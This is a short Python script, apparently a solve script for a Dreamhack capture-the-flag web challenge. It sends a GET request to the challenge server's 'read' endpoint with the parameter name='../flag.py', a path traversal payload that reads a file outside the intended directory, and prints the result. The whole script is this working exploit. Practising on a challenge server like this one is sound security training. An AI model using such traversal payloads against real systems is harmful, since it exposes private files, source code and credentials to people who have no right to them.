import requests

port = 18069
url_index = f'http://host1.dreamhack.games:{port}/'
url_read = url_index + 'read'

filename = '../flag.py'
url_read += f'?name={filename}'
response = requests.get(url_read)
print(response.text)